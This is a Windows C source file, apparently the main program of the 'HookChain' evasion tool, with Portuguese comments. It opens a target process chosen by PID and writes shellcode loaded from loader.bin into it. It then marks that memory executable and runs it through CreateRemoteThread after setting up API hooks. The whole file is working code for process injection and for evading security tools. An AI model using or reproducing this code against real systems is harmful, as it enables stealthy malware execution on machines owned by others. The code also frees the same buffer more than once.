#pragma once

#include <stdio.h>
#include <Windows.h>
#include "hook.h"

INT wmain(int argc, char* argv[]) {
    NTSTATUS status;
    PVOID shellAddress = NULL;
    HANDLE hProcess = NULL;
    DWORD dwPID = 0;

    // Obtendo o PID do processo alvo
    if (argc >= 2) {
        dwPID = atoi(argv[1]);
    }
    else {
        char cPid[7];
        printf("Digite o PID: \n");
        fgets(cPid, sizeof(cPid), stdin);
        dwPID = atoi(cPid);
    }

    if (dwPID == 0) {
        printf("[!] Falha ao obter PID\n");
        return 1;
    }

    printf("\n[+] Criando implante HookChain\n");
    if (!InitApi()) {
        printf("[!] Falha ao inicializar API\n");
        return 1;
    }

    printf("\n[+] HookChain implantado! \\o/\n\n");

    printf("[*] Criando Handle para o PID %d\n", dwPID);

    // Abrindo o processo de destino
    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (hProcess == NULL) {
        printf("[!] Falha ao abrir o processo: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Alocando memória no processo com permissões READ_WRITE\n");

    printf("[*] Carregando shellcode do arquivo loader.bin\n");

    FILE* file;
    errno_t err = fopen_s(&file, "loader.bin", "rb");
    if (err != 0 || file == NULL) {
        printf("[!] Falha ao abrir o arquivo loader.bin\n");
        CloseHandle(hProcess);
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* shellcode = (unsigned char*)malloc(fileSize);
    if (shellcode == NULL) {
        printf("[!] Falha ao alocar memória para o shellcode\n");
        fclose(file);
        CloseHandle(hProcess);
        return 1;
    }


    fread(shellcode, 1, fileSize, file);
    fclose(file);

    SIZE_T memSize = fileSize;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &shellAddress, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        printf("[!] Falha ao alocar memória com permissões READ_WRITE: Status = 0x%08lx\n", GetLastError());
        free(shellcode);
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, shellAddress, shellcode, fileSize, NULL)) {
        printf("[!] Falha ao escrever shellcode: Status = 0x%08lx\n", GetLastError());
        free(shellcode);
        CloseHandle(hProcess);
        return 1;
    }

    // Liberar memória após o uso
    free(shellcode);


    printf("[*] Alterando permissões de memória para EXECUTE_READ\n");

    DWORD oldProtect;
    if (!NT_SUCCESS(NtProtectVirtualMemory(hProcess, &shellAddress, &memSize, PAGE_EXECUTE_READ, &oldProtect))) {
        printf("[!] Falha ao alterar permissões de memória: Status = 0x%08lx\n", GetLastError());
        free(shellcode);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[*] Criando thread remota para executar o shellcode\n");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] Falha ao criar thread remota: Status = 0x%08lx\n", GetLastError());
        free(shellcode);
        CloseHandle(hProcess);
        return 1;
    }

    // Desativando prints de Hook
    SetDebug(FALSE);

    printf("[+] Shellcode executado com sucesso!\n");
    printf("[+] Alterado por Joas A Santos!\n");
    printf("\n\n _     _  _____   _____  _     _ _______ _     _ _______ _____ __   _\n |_____| |     | |     | |____/  |       |_____| |_____|   |   | \\  |\n |     | |_____| |_____| |    \\_ |_____  |     | |     | __|__ |  \\_|\n                                                          By M4v3r1ck\n\n");

    free(shellcode);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
